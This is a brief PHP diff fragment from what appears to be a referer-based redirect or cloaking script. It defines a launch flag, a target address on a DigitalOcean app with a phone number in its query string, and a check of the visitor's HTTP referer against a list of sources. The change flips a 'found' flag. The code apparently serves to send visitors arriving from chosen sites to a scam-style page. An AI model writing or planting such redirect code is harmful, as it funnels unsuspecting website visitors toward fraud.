@@ -10,7 +10,7 @@
     $lanzar=true;
     $dominio_m='whale-app-z8c92.ondigitalocean.app/?phone=01-87-65-31-10'; // fr 
 
-    $encontrado=true;
+    $encontrado=false;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
         foreach ($referers as $referer){
             $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
